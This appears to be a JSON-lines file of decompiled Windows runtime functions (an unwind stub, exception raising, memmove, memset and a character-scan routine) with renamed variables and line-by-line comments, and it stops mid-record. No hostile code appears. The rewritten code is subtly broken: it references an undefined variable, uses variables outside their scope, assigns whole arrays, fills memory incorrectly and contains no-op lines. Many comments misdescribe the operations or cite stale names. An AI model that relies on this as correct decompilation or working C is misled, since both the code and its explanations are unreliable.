{"Function Name": "Unwind@14000c228", "Address": "14000c228", "Source Code": "\nvoid unwindFunction(void) // Function definition for Unwind_14000c228\n{\n    cleanup(); // Call the terminate function to perform cleanup or shutdown\n    ((code *)softwareInterrupt(3))(); // Call a software interrupt with ID 3 and execute the resulting code\n}\n"}
{"Function Name": "FUN_14000c234", "Address": "14000c234", "Source Code": "\nvoid FUN_14000c234(longlong *inputPointer, byte *bytePointer)\n{\n    // Initialize variables with predefined constants\n    undefined8 exceptionCode = _DAT_140025e20; // Exception code\n    undefined8 exceptionInfo = _UNK_140025e38;  // Exception information\n    undefined4 exceptionParams = _DAT_140025e40; // Local variable for exception parameters\n    undefined8 fileHeaderResult; // Variable to store result from RtlPcToFileHeader\n\n    // Check if param_2 is not null and if the 4th bit is set\n    if ((bytePointer != (byte *)0x0) && ((*bytePointer & 0x10) != 0)) {\n        // Retrieve a pointer from a specific location based on param_1\n        bytePointer = *(byte **)(*(longlong *)(*inputPointer + -8) + 0x30);\n        // Call the guard dispatch function\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)();\n    }\n\n    // Call RtlPcToFileHeader to get the file header based on param_2\n    fileHeaderResult = RtlPcToFileHeader(bytePointer, &fileHeaderResult);\n    \n    // Check if param_2 is not null and if the 3rd bit is set or if local_res8 is null\n    if ((bytePointer != (byte *)0x0) && (((*bytePointer & 8) != 0 || (fileHeaderResult == (PVOID)0x0)))) {\n        // Set local_28 to a specific error code\n        exceptionParams = 0x1994000;\n    }\n\n    // Raise an exception with the specified parameters\n    RaiseException((DWORD)exceptionCode, (DWORD)((ulonglong)exceptionCode >> 0x20), (DWORD)exceptionInfo, (ULONG_PTR *)&exceptionParams);\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_14000c330", "Address": "14000c330", "Source Code": "\nundefined8 * FUN_14000c330(undefined8 *destination, undefined8 *source, ulonglong size)\n{\n    undefined1 byteValue; // Variable to hold a single byte value\n    undefined2 shortValue; // Variable to hold a two-byte value\n    undefined4 fourByteValue1, fourByteValue2, fourByteValue3, fourByteValue4; // Variables to hold four-byte values\n    longlong pointerDifference; // Variable to hold the difference between param_2 and param_1\n    ulonglong remainingBytes, chunkCount; // Variables for loop counters and calculations\n    undefined8 value1, value2, value3, value4; // Variables to hold eight-byte values\n\n    switch(size) { // Switch statement based on the value of param_3\n        case 0: return destination; // If param_3 is 0, return param_1 unchanged\n        case 1: *(undefined1 *)destination = *(undefined1 *)source; return destination; // Copy 1 byte from param_2 to param_1\n        case 2: *(undefined2 *)destination = *(undefined2 *)source; return destination; // Copy 2 bytes from param_2 to param_1\n        case 3:\n            byteValue = *(undefined1 *)((longlong)source + 2); // Get the third byte from param_2\n            *(undefined2 *)destination = *(undefined2 *)source; // Copy first 2 bytes\n            *(undefined1 *)((longlong)destination + 2) = byteValue; // Set the third byte in param_1\n            return destination;\n        case 4: *(undefined4 *)destination = *(undefined4 *)source; return destination; // Copy 4 bytes from param_2 to param_1\n        case 5:\n            byteValue = *(undefined1 *)((longlong)source + 4); // Get the fifth byte from param_2\n            *(undefined4 *)destination = *(undefined4 *)source; // Copy first 4 bytes\n            *(undefined1 *)((longlong)destination + 4) = byteValue; // Set the fifth byte in param_1\n            return destination;\n        case 6:\n            shortValue = *(undefined2 *)((longlong)source + 4); // Get the fifth and sixth bytes from param_2\n            *(undefined4 *)destination = *(undefined4 *)source; // Copy first 4 bytes\n            *(undefined2 *)((longlong)destination + 4) = shortValue; // Set the fifth and sixth bytes in param_1\n            return destination;\n        case 7:\n            shortValue = *(undefined2 *)((longlong)source + 4); // Get the fifth and sixth bytes from param_2\n            byteValue = *(undefined1 *)((longlong)source + 6); // Get the seventh byte from param_2\n            *(undefined4 *)destination = *(undefined4 *)source; // Copy first 4 bytes\n            *(undefined2 *)((longlong)destination + 4) = shortValue; // Set the fifth and sixth bytes in param_1\n            *(undefined1 *)((longlong)destination + 6) = byteValue; // Set the seventh byte in param_1\n            return destination;\n        case 8: *destination = *source; return destination; // Copy 8 bytes from param_2 to param_1\n        case 9:\n            byteValue = *(undefined1 *)(source + 1); // Get the second byte from param_2\n            *destination = *source; // Copy first 8 bytes\n            *(undefined1 *)(destination + 1) = byteValue; // Set the second byte in param_1\n            return destination;\n        case 10:\n            shortValue = *(undefined2 *)(source + 1); // Get the second and third bytes from param_2\n            *destination = *source; // Copy first 8 bytes\n            *(undefined2 *)(destination + 1) = shortValue; // Set the second and third bytes in param_1\n            return destination;\n        case 0xb:\n            shortValue = *(undefined2 *)(source + 1); // Get the second and third bytes from param_2\n            byteValue = *(undefined1 *)((longlong)source + 10); // Get the eleventh byte from param_2\n            *destination = *source; // Copy first 8 bytes\n            *(undefined2 *)(destination + 1) = shortValue; // Set the second and third bytes in param_1\n            *(undefined1 *)((longlong)destination + 10) = byteValue; // Set the eleventh byte in param_1\n            return destination;\n        case 0xc:\n            fourByteValue1 = *(undefined4 *)(source + 1); // Get the second 4-byte value from param_2\n            *destination = *source; // Copy first 8 bytes\n            *(undefined4 *)(destination + 1) = fourByteValue1; // Set the second 4-byte value in param_1\n            return destination;\n        case 0xd:\n            fourByteValue1 = *(undefined4 *)(source + 1); // Get the second 4-byte value from param_2\n            byteValue = *(undefined1 *)((longlong)source + 0xc); // Get the twelfth byte from param_2\n            *destination = *source; // Copy first 8 bytes\n            *(undefined4 *)(destination + 1) = fourByteValue1; // Set the second 4-byte value in param_1\n            *(undefined1 *)((longlong)destination + 0xc) = byteValue; // Set the twelfth byte in param_1\n            return destination;\n        case 0xe:\n            fourByteValue1 = *(undefined4 *)(source + 1); // Get the second 4-byte value from param_2\n            shortValue = *(undefined2 *)((longlong)source + 0xc); // Get the twelfth and thirteenth bytes from param_2\n            *destination = *source; // Copy first 8 bytes\n            *(undefined4 *)(destination + 1) = fourByteValue1; // Set the second 4-byte value in param_1\n            *(undefined2 *)((longlong)destination + 0xc) = shortValue; // Set the twelfth and thirteenth bytes in param_1\n            return destination;\n        case 0xf:\n            fourByteValue1 = *(undefined4 *)(source + 1); // Get the second 4-byte value from param_2\n            shortValue = *(undefined2 *)((longlong)source + 0xc); // Get the twelfth and thirteenth bytes from param_2\n            byteValue = *(undefined1 *)((longlong)source + 0xe); // Get the fourteenth byte from param_2\n            *destination = *source; // Copy first 8 bytes\n            *(undefined4 *)(destination + 1) = fourByteValue1; // Set the second 4-byte value in param_1\n            *(undefined2 *)((longlong)destination + 0xc) = shortValue; // Set the twelfth and thirteenth bytes in param_1\n            *(undefined1 *)((longlong)destination + 0xe) = byteValue; // Set the fourteenth byte in param_1\n            return destination;\n        case 0x10:\n            value1 = source[1]; // Get the second 8-byte value from param_2\n            *destination = *source; // Copy first 8 bytes\n            destination[1] = value1; // Set the second 8-byte value in param_1\n            return destination;\n    }\n    if (0x20 < size) { // If param_3 is greater than 32\n        pointerDifference = (longlong)source - (longlong)destination; // Calculate the difference between param_2 and param_1\n        if ((source < destination) && (destination < (undefined8 *)(size + (longlong)source))) { // Check if param_1 is within the range of param_2\n            undefined8 *currentPointer = (undefined8 *)((longlong)destination + pointerDifference + (size - 0x10)); // Calculate a pointer offset\n            value1 = *currentPointer; // Get the value at the calculated pointer\n            value3 = currentPointer[1]; // Get the next value\n            undefined8 *nextPointer = (undefined8 *)((longlong)destination + (size - 0x10)); // Calculate another pointer\n            remainingBytes = size - 0x10; // Adjust uVar13\n            if (((ulonglong)nextPointer & 0xf) != 0) { // Check if puVar11 is not aligned\n                currentPointer = (undefined8 *)((ulonglong)nextPointer & 0xfffffffffffffff0); // Align puVar10\n                value1 = *(undefined8 *)((longlong)currentPointer + pointerDifference); // Get the value at the aligned pointer\n                value3 = ((undefined8 *)((longlong)currentPointer + pointerDifference))[1]; // Get the next value\n                *nextPointer = value1; // Set the value at puVar11\n                *(undefined8 *)((longlong)destination + (size - 8)) = value3; // Set the next value\n                remainingBytes = (longlong)currentPointer - (longlong)destination; // Update uVar13\n            }\n            chunkCount = remainingBytes >> 7; // Calculate how many 128-byte chunks there are\n            if (chunkCount != 0) { // If there are chunks to process\n                *currentPointer = value1; // Set the first chunk\n                currentPointer[1] = value3; // Set the second chunk\n                while (true) { // Loop through the chunks\n                    undefined8 *previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + -0x10); // Calculate the previous chunk\n                    value1 = previousChunkPointer[1]; // Get the next value\n                    currentPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + -0x20); // Move to the next chunk\n                    value3 = *currentPointer; // Get the value at the new chunk\n                    value2 = currentPointer[1]; // Get the next value\n                    currentPointer = currentPointer + -0x10; // Move to the previous chunk\n                    currentPointer[-2] = *previousChunkPointer; // Set the first value\n                    currentPointer[-1] = value1; // Set the second value\n                    currentPointer[-4] = value3; // Set the third value\n                    currentPointer[-3] = value2; // Set the fourth value\n                    previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + -0x30); // Calculate the next chunk\n                    value1 = previousChunkPointer[1]; // Get the next value\n                    undefined8 *nextChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + -0x40); // Calculate another chunk\n                    value3 = *nextChunkPointer; // Get the value at the new chunk\n                    value2 = nextChunkPointer[1]; // Get the next value\n                    chunkCount = chunkCount - 1; // Decrement the chunk counter\n                    currentPointer[-6] = *previousChunkPointer; // Set the first value\n                    currentPointer[-5] = value1; // Set the second value\n                    currentPointer[-8] = value3; // Set the third value\n                    currentPointer[-7] = value2; // Set the fourth value\n                    previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + -0x50); // Calculate the next chunk\n                    value1 = previousChunkPointer[1]; // Get the next value\n                    nextChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + -0x60); // Calculate another chunk\n                    value3 = *nextChunkPointer; // Get the value at the new chunk\n                    value2 = nextChunkPointer[1]; // Get the next value\n                    currentPointer[-10] = *previousChunkPointer; // Set the first value\n                    currentPointer[-9] = value1; // Set the second value\n                    currentPointer[-0xc] = value3; // Set the third value\n                    currentPointer[-0xb] = value2; // Set the fourth value\n                    previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + -0x70); // Calculate the next chunk\n                    value1 = *previousChunkPointer; // Get the value at the new chunk\n                    value3 = previousChunkPointer[1]; // Get the next value\n                    value2 = *(undefined8 *)((longlong)currentPointer + pointerDifference); // Get the value at the current chunk\n                    value4 = ((undefined8 *)((longlong)currentPointer + pointerDifference))[1]; // Get the next value\n                    if (chunkCount == 0) break; // Exit loop if no more chunks\n                    currentPointer[-0xe] = value1; // Set the first value\n                    currentPointer[-0xd] = value3; // Set the second value\n                    *currentPointer = value2; // Set the third value\n                    currentPointer[-0xf] = value4; // Set the fourth value\n                    currentPointer = currentPointer; // No operation, just to keep the loop structure\n                }\n                currentPointer[-0xe] = value1; // Set the first value\n                currentPointer[-0xd] = value3; // Set the second value\n                remainingBytes = remainingBytes & 0x7f; // Update uVar13\n            }\n            for (chunkCount = remainingBytes >> 4; chunkCount != 0; chunkCount = chunkCount - 1) { // Loop through remaining values\n                *currentPointer = value1; // Set the first value\n                currentPointer[1] = value3; // Set the second value\n                currentPointer = currentPointer + -2; // Move to the previous position\n                value1 = *(undefined8 *)((longlong)currentPointer + pointerDifference); // Get the value at the new position\n                value3 = ((undefined8 *)((longlong)currentPointer + pointerDifference))[1]; // Get the next value\n            }\n            if ((remainingBytes & 0xf) != 0) { // If there are remaining bytes\n                value1 = source[1]; // Get the second 8-byte value from param_2\n                *destination = *source; // Copy first 8 bytes\n                destination[1] = value1; // Set the second 8-byte value in param_1\n            }\n            *currentPointer = value1; // Set the first value\n            currentPointer[1] = value3; // Set the second value\n            return destination; // Return the modified param_1\n        }\n    }\n    if (size < 0x81) { // If param_3 is less than 129\n        undefined4 *fourBytePointer = (undefined4 *)((longlong)destination + pointerDifference); // Calculate pointer to param_1\n        fourByteValue1 = *fourBytePointer; // Get the first 4-byte value\n        fourByteValue2 = fourBytePointer[1]; // Get the second 4-byte value\n        fourByteValue3 = fourBytePointer[2]; // Get the third 4-byte value\n        fourByteValue4 = fourBytePointer[3]; // Get the fourth 4-byte value\n        undefined8 *currentPointer = destination + 2; // Calculate pointer offset\n        remainingBytes = size - 0x10; // Adjust uVar13\n    } else {\n        if (((byte)DAT_140039c10 & 2) != 0) { // Check a condition based on a global variable\n            return (undefined8 *)FUN_14000c310((undefined1 *)destination, pointerDifference, size); // Call another function if condition is met\n        }\n        undefined4 *fourBytePointer = (undefined4 *)((longlong)destination + pointerDifference); // Calculate pointer to param_1\n        fourByteValue1 = *fourBytePointer; // Get the first 4-byte value\n        fourByteValue2 = fourBytePointer[1]; // Get the second 4-byte value\n        fourByteValue3 = fourBytePointer[2]; // Get the third 4-byte value\n        fourByteValue4 = fourBytePointer[3]; // Get the fourth 4-byte value\n        undefined8 *currentPointer = destination + 2; // Calculate pointer offset\n        if (((ulonglong)destination & 0xf) != 0) { // Check if param_1 is not aligned\n            fourBytePointer = (undefined4 *)(((ulonglong)currentPointer & 0xfffffffffffffff0) + pointerDifference); // Align puVar1\n            fourByteValue1 = *fourBytePointer; // Get the first 4-byte value\n            fourByteValue2 = fourBytePointer[1]; // Get the second 4-byte value\n            fourByteValue3 = fourBytePointer[2]; // Get the third 4-byte value\n            fourByteValue4 = fourBytePointer[3]; // Get the fourth 4-byte value\n            currentPointer = (undefined8 *)(((ulonglong)currentPointer & 0xfffffffffffffff0) + 0x10); // Align puVar10\n            *(undefined4 *)destination = *fourBytePointer; // Set the first 4-byte value in param_1\n            *(undefined4 *)((longlong)destination + 4) = fourByteValue2; // Set the second 4-byte value in param_1\n            *(undefined4 *)(destination + 1) = fourByteValue3; // Set the third 4-byte value in param_1\n            *(undefined4 *)((longlong)destination + 0xc) = fourByteValue4; // Set the fourth 4-byte value in param_1\n        }\n        remainingBytes = (longlong)destination + (size - (longlong)currentPointer); // Calculate remaining bytes\n        chunkCount = remainingBytes >> 7; // Calculate how many 128-byte chunks there are\n        if (chunkCount != 0) { // If there are chunks to process\n            *(undefined4 *)(currentPointer + -2) = fourByteValue1; // Set the first value\n            *(undefined4 *)((longlong)currentPointer + -0xc) = fourByteValue2; // Set the second value\n            *(undefined4 *)(currentPointer + -1) = fourByteValue3; // Set the third value\n            *(undefined4 *)((longlong)currentPointer + -4) = fourByteValue4; // Set the fourth value\n            if (DAT_140038098 < chunkCount) { // Check a condition based on a global variable\n                while (true) { // Loop through the chunks\n                    value1 = ((undefined8 *)((longlong)currentPointer + pointerDifference))[1]; // Get the next value\n                    undefined8 *previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x10); // Calculate the next chunk\n                    value3 = *previousChunkPointer; // Get the value at the new chunk\n                    value2 = previousChunkPointer[1]; // Get the next value\n                    currentPointer = currentPointer + 0x10; // Move to the next chunk\n                    *currentPointer = *(undefined8 *)((longlong)currentPointer + pointerDifference); // Set the value at the new chunk\n                    currentPointer[1] = value1; // Set the next value\n                    currentPointer[2] = value3; // Set the third value\n                    currentPointer[3] = value2; // Set the fourth value\n                    previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x20); // Calculate the next chunk\n                    value1 = previousChunkPointer[1]; // Get the next value\n                    undefined8 *nextChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x30); // Calculate another chunk\n                    value3 = *nextChunkPointer; // Get the value at the new chunk\n                    value2 = nextChunkPointer[1]; // Get the next value\n                    chunkCount = chunkCount - 1; // Decrement the chunk counter\n                    currentPointer[4] = *previousChunkPointer; // Set the first value\n                    currentPointer[5] = value1; // Set the second value\n                    currentPointer[6] = value3; // Set the third value\n                    currentPointer[7] = value2; // Set the fourth value\n                    previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x40); // Calculate the next chunk\n                    value1 = previousChunkPointer[1]; // Get the next value\n                    nextChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x50); // Calculate another chunk\n                    value3 = *nextChunkPointer; // Get the value at the new chunk\n                    value2 = nextChunkPointer[1]; // Get the next value\n                    currentPointer[8] = *previousChunkPointer; // Set the first value\n                    currentPointer[9] = value1; // Set the second value\n                    currentPointer[10] = value3; // Set the third value\n                    currentPointer[0xb] = value2; // Set the fourth value\n                    previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x60); // Calculate the next chunk\n                    value1 = *previousChunkPointer; // Get the value at the new chunk\n                    value3 = previousChunkPointer[1]; // Get the next value\n                    undefined4 *fourBytePointer = (undefined4 *)((longlong)currentPointer + pointerDifference + 0x70); // Calculate another chunk\n                    fourByteValue1 = *fourBytePointer; // Get the first 4-byte value\n                    fourByteValue2 = fourBytePointer[1]; // Get the second 4-byte value\n                    fourByteValue3 = fourBytePointer[2]; // Get the third 4-byte value\n                    fourByteValue4 = fourBytePointer[3]; // Get the fourth 4-byte value\n                    if (chunkCount == 0) break; // Exit loop if no more chunks\n                    currentPointer[0xc] = value1; // Set the first value\n                    currentPointer[0xd] = value3; // Set the second value\n                    *(undefined4 *)(currentPointer + 0xe) = fourByteValue1; // Set the third value\n                    *(undefined4 *)((longlong)currentPointer + 0x74) = fourByteValue2; // Set the fourth value\n                    *(undefined4 *)(currentPointer + 0xf) = fourByteValue3; // Set the fifth value\n                    *(undefined4 *)((longlong)currentPointer + 0x7c) = fourByteValue4; // Set the sixth value\n                    currentPointer = currentPointer; // No operation, just to keep the loop structure\n                }\n            } else { // If there are fewer chunks to process\n                while (true) { // Loop through the chunks\n                    value1 = ((undefined8 *)((longlong)currentPointer + pointerDifference))[1]; // Get the next value\n                    undefined8 *previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x10); // Calculate the next chunk\n                    value3 = *previousChunkPointer; // Get the value at the new chunk\n                    value2 = previousChunkPointer[1]; // Get the next value\n                    currentPointer = currentPointer + 0x10; // Move to the next chunk\n                    *currentPointer = *(undefined8 *)((longlong)currentPointer + pointerDifference); // Set the value at the new chunk\n                    currentPointer[1] = value1; // Set the next value\n                    currentPointer[2] = value3; // Set the third value\n                    currentPointer[3] = value2; // Set the fourth value\n                    previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x20); // Calculate the next chunk\n                    value1 = previousChunkPointer[1]; // Get the next value\n                    undefined8 *nextChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x30); // Calculate another chunk\n                    value3 = *nextChunkPointer; // Get the value at the new chunk\n                    value2 = nextChunkPointer[1]; // Get the next value\n                    chunkCount = chunkCount - 1; // Decrement the chunk counter\n                    currentPointer[4] = *previousChunkPointer; // Set the first value\n                    currentPointer[5] = value1; // Set the second value\n                    currentPointer[6] = value3; // Set the third value\n                    currentPointer[7] = value2; // Set the fourth value\n                    previousChunkPointer = (undefined8 *)((longlong)currentPointer + pointerDifference + 0x40); // Calculate the next chunk\n                    value1 = *pu3; // Get the value at the new chunk\n                    value3 = previousChunkPointer[1]; // Get the next value\n                    undefined4 *fourBytePointer = (undefined4 *)((longlong)currentPointer + pointerDifference + 0x70); // Calculate another chunk\n                    fourByteValue1 = *fourBytePointer; // Get the first 4-byte value\n                    fourByteValue2 = fourBytePointer[1]; // Get the second 4-byte value\n                    fourByteValue3 = fourBytePointer[2]; // Get the third 4-byte value\n                    fourByteValue4 = fourBytePointer[3]; // Get the fourth 4-byte value\n                    if (chunkCount == 0) break; // Exit loop if no more chunks\n                    currentPointer[0xc] = value1; // Set the first value\n                    currentPointer[0xd] = value3; // Set the second value\n                    *(undefined4 *)(currentPointer + 0xe) = fourByteValue1; // Set the third value\n                    *(undefined4 *)((longlong)currentPointer + 0x74) = fourByteValue2; // Set the fourth value\n                    *(undefined4 *)(currentPointer + 0xf) = fourByteValue3; // Set the fifth value\n                    *(undefined4 *)((longlong)currentPointer + 0x7c) = fourByteValue4; // Set the sixth value\n                    currentPointer = currentPointer; // No operation, just to keep the loop structure\n                }\n            }\n            currentPointer[-4] = value1; // Set the first value\n            currentPointer[-3] = value3; // Set the second value\n            remainingBytes = remainingBytes & 0x7f; // Update uVar13\n        }\n    }\n    for (chunkCount = remainingBytes >> 4; chunkCount != 0; chunkCount = chunkCount - 1) { // Loop through remaining values\n        *(undefined4 *)(currentPointer + -2) = fourByteValue1; // Set the first value\n        *(undefined4 *)((longlong)currentPointer + -0xc) = fourByteValue2; // Set the second value\n        *(undefined4 *)(currentPointer + -1) = fourByteValue3; // Set the third value\n        *(undefined4 *)((longlong)currentPointer + -4) = fourByteValue4; // Set the fourth value\n        undefined4 *fourBytePointer = (undefined4 *)((longlong)currentPointer + pointerDifference); // Calculate pointer to param_1\n        fourByteValue1 = *fourBytePointer; // Get the first 4-byte value\n        fourByteValue2 = fourBytePointer[1]; // Get the second 4-byte value\n        fourByteValue3 = fourBytePointer[2]; // Get the third 4-byte value\n        fourByteValue4 = fourBytePointer[3]; // Get the fourth 4-byte value\n        currentPointer = currentPointer + 2; // Move to the next position\n    }\n    remainingBytes = remainingBytes & 0xf; // Update uVar13\n    if (remainingBytes != 0) { // If there are remaining bytes\n        undefined8 *currentPointer = (undefined8 *)((longlong)source + (size - 0x10)); // Calculate pointer offset\n        value1 = currentPointer[1]; // Get the next value\n        *(undefined8 *)((longlong)destination + (remainingBytes - 0x10)) = *currentPointer; // Set the value in param_1\n        *(undefined8 *)((longlong)destination + (remainingBytes - 8)) = value1; // Set the next value in param_1\n    }\n    *(undefined4 *)(currentPointer + -2) = fourByteValue1; // Set the first value\n    *(undefined4 *)((longlong)currentPointer + -0xc) = fourByteValue2; // Set the second value\n    *(undefined4 *)(currentPointer + -1) = fourByteValue3; // Set the third value\n    *(undefined4 *)((longlong)currentPointer + -4) = fourByteValue4; // Set the fourth value\n    return destination; // Return the modified param_1\n}\n"}
{"Function Name": "FUN_14000c740", "Address": "14000c740", "Source Code": "\nundefined1 (*) [16] FUN_14000c740(undefined1 (*input_array) [16], byte byte_value, ulonglong count)\n{\n    undefined1 byte_value_extracted; // Variable to hold the 1-byte value derived from uVar6\n    ulonglong computed_value; // Variable to hold the computed ulonglong value\n    undefined1 data_array[16]; // Array to hold 16 bytes of data\n    undefined2 two_byte_value_extracted; // Variable to hold the 2-byte value derived from uVar6\n    undefined4 four_byte_value_extracted; // Variable to hold the 4-byte value derived from uVar6\n\n    // Compute uVar6 based on param_2, scaling it for 8-byte alignment\n    computed_value = (ulonglong)byte_value * 0x101010101010101;\n    byte_value_extracted = (undefined1)computed_value; // Extract the 1-byte value from uVar6\n    two_byte_value_extracted = (undefined2)computed_value; // Extract the 2-byte value from uVar6\n    four_byte_value_extracted = (undefined4)computed_value; // Extract the 4-byte value from uVar6\n\n    // Switch statement to handle different cases based on param_3\n    switch(count) {\n        case 0: \n            return input_array; // Return original pointer if param_3 is 0\n        case 8: \n            *(ulonglong *)*input_array = computed_value; // Store uVar6 in the first element of param_1\n            return input_array;\n        case 9: \n            *(ulonglong *)(input_array[-1] + count + 7) = computed_value; // Store uVar6 in calculated position\n            input_array[-1][count + 0xf] = byte_value_extracted; // Store uVar3 in calculated position\n            return input_array;\n        case 10: \n            *(ulonglong *)*input_array = computed_value; // Store uVar6 in the first element of param_1\n            *(undefined2 *)(*input_array + 8) = two_byte_value_extracted; // Store uVar4 in the position after the first element\n            return input_array;\n        case 0xb: \n            *(ulonglong *)*input_array = computed_value; // Store uVar6 in the first element of param_1\n            *(undefined2 *)(*input_array + 8) = two_byte_value_extracted; // Store uVar4 in the position after the first element\n            (*input_array)[10] = byte_value_extracted; // Store uVar3 in the 11th position\n            return input_array;\n        case 0xc: \n            *(ulonglong *)(input_array[-1] + count + 4) = computed_value; // Store uVar6 in calculated position\n        case 4: \n            *(undefined4 *)(input_array[-1] + count + 0xc) = four_byte_value_extracted; // Store uVar5 in calculated position\n            return input_array;\n        case 0xd: \n            *(ulonglong *)(input_array[-1] + count + 3) = computed_value; // Store uVar6 in calculated position\n        case 5: \n            *(undefined4 *)(input_array[-1] + count + 0xb) = four_byte_value_extracted; // Store uVar5 in calculated position\n            input_array[-1][count + 0xf] = byte_value_extracted; // Store uVar3 in calculated position\n            return input_array;\n        case 0xe: \n            *(ulonglong *)(input_array[-1] + count + 2) = computed_value; // Store uVar6 in calculated position\n        case 6: \n            *(undefined4 *)(input_array[-1] + count + 10) = four_byte_value_extracted; // Store uVar5 in calculated position\n        case 2: \n            *(undefined2 *)(input_array[-1] + count + 0xe) = two_byte_value_extracted; // Store uVar4 in calculated position\n            return input_array;\n        case 0xf: \n            *(ulonglong *)(input_array[-1] + count + 1) = computed_value; // Store uVar6 in calculated position\n        case 7: \n            *(undefined4 *)(input_array[-1] + count + 9) = four_byte_value_extracted; // Store uVar5 in calculated position\n        case 3: \n            *(undefined2 *)(input_array[-1] + count + 0xd) = two_byte_value_extracted; // Store uVar4 in calculated position\n        case 1: \n            input_array[-1][count + 0xf] = byte_value_extracted; // Store uVar3 in calculated position\n            return input_array;\n        case 0x10: \n            *(ulonglong *)*input_array = computed_value; // Store uVar6 in the first element of param_1\n            *(ulonglong *)(*input_array + 8) = computed_value; // Store uVar6 in the position after the first element\n            return input_array;\n    }\n\n    // Fill auVar7 with the computed values based on uVar6\n    data_array[0] = byte_value_extracted; // Set the first byte\n    data_array[1] = byte_value_extracted; // Set the second byte\n    for (int index = 2; index < 16; index++) {\n        data_array[index] = (undefined1)(computed_value >> (8 * (15 - index))); // Fill remaining bytes\n    }\n\n    // Check if param_3 is greater than 0x80\n    if (count > 0x80) {\n        // Check if a specific bit is set in DAT_140039c10\n        if (((byte)DAT_140039c10 & 2) != 0) {\n            // Loop to decrement param_3 and fill param_1 with param_2\n            for (; count != 0; count--) {\n                (*input_array)[0] = byte_value; // Fill first byte of param_1\n                input_array = (undefined1 (*) [16])(*input_array + 1); // Move to the next position\n            }\n            return input_array; // Return updated pointer\n        }\n        *input_array = data_array; // Store auVar7 in param_1\n        input_array = (undefined1 (*) [16])((ulonglong)(input_array + 1) & 0xfffffffffffffff0); // Align pointer\n        count = (longlong)input_array + (count - (longlong)input_array); // Adjust param_3\n        computed_value = count >> 7; // Calculate how many full sets of 8 can be filled\n        if (computed_value != 0) {\n            do {\n                *input_array = data_array; // Fill 8 positions with auVar7\n                input_array[1] = data_array;\n                input_array[2] = data_array;\n                input_array[3] = data_array;\n                input_array[4] = data_array;\n                input_array[5] = data_array;\n                input_array[6] = data_array;\n                input_array[7] = data_array;\n                input_array += 8; // Move pointer forward by 8\n                computed_value--; // Decrement the count\n            } while (computed_value != 0); // Repeat until all sets are filled\n            count &= 0x7f; // Mask param_3 to get the remainder\n        }\n    }\n    \n    // Fill remaining positions based on the remaining count in param_3\n    for (computed_value = count >> 4; computed_value != 0; computed_value--) {\n        *input_array = data_array; // Fill param_1 with auVar7\n        input_array++; // Move to the next position\n    }\n    // If there are remaining bytes to fill, fill the last position\n    if ((count & 0xf) != 0) {\n        *(undefined1 (*) [16])(input_array[-1] + (count & 0xf)) = data_array; // Fill the last calculated position\n    }\n    return input_array; // Return the updated pointer\n}\n"}
{"Function Name": "FUN_14000c900", "Address": "14000c900", "Source Code": "\nchar * FUN_14000c900(char *input_string, uint comparison_char, ulonglong remaining_chars)\n{\n    longlong match_index; // Variable to hold the index of the matching character\n    ushort match_result;   // Variable to hold the result of character comparisons\n    char current_char;    // Variable to hold the current character being compared\n    undefined1 comparison_results[16]; // Array to store comparison results for 16 characters\n\n    // Check if param_3 is greater than 15\n    if (0xf < remaining_chars) {\n        // Prepare param_2 for comparison by expanding it into a 32-bit value\n        comparison_char = (comparison_char & 0xff) * 0x1010101;\n        do {\n            current_char = (char)comparison_char; // Get the first character from param_2\n            // Compare each character in param_1 with the corresponding character from param_2\n            comparison_results[0] = -(input_string[0] == current_char);\n            comparison_results[1] = -(input_string[1] == (char)(comparison_char >> 8));\n            comparison_results[2] = -(input_string[2] == (char)(comparison_char >> 0x10));\n            comparison_results[3] = -(input_string[3] == (char)(comparison_char >> 0x18));\n            comparison_results[4] = -(input_string[4] == current_char);\n            comparison_results[5] = -(input_string[5] == (char)(comparison_char >> 8));\n            comparison_results[6] = -(input_string[6] == (char)(comparison_char >> 0x10));\n            comparison_results[7] = -(input_string[7] == (char)(comparison_char >> 0x18));\n            comparison_results[8] = -(input_string[8] == current_char);\n            comparison_results[9] = -(input_string[9] == (char)(comparison_char >> 8));\n            comparison_results[10] = -(input_string[10] == (char)(comparison_char >> 0x10));\n            comparison_results[0xb] = -(input_string[0xb] == (char)(comparison_char >> 0x18));\n            comparison_results[0xc] = -(input_string[0xc] == current_char);\n            comparison_results[0xd] = -(input_string[0xd] == (char)(comparison_char >> 8));\n            comparison_results[0xe] = -(input_string[0xe] == (char)(comparison_char >> 0x10));\n            comparison_results[0xf] = -(input_string[0xf] == (char)(comparison_char >> 0x18));\n            // Calculate the number of matching characters\n            match_result = (ushort)(SUB161(comparison_results >> 7, 0) & 1) | (ushort)(SUB161(comparison_results >> 0xf, 0) & 1) << 1 |\n                     (ushort)(SUB161(comparison_results >> 0x17, 0) & 1) << 2 | (ushort)(SUB161(comparison_results >> 0x1f, 0) & 1) << 3 |\n                     (ushort)(SUB161(comparison_results >> 0x27, 0) & 1) << 4 | (ushort)(SUB161(comparison_results >> 0x2f, 0) & 1) << 5 |\n                     (ushort)(SUB161(comparison_results >> 0x37, 0) & 1) << 6 | (ushort)(SUB161(comparison_results >> 0x3f, 0) & 1) << 7 |\n                     (ushort)(SUB161(comparison_results >> 0x47, 0) & 1) << 8 | (ushort)(SUB161(comparison_results >> 0x4f, 0) & 1) << 9 |\n                     (ushort)(SUB161(comparison_results >> 0x57, 0) & 1) << 10 | (ushort)(SUB161(comparison_results >> 0x5f, 0) & 1) << 0xb |\n                     (ushort)(SUB161(comparison_results >> 0x67, 0) & 1) << 0xc | 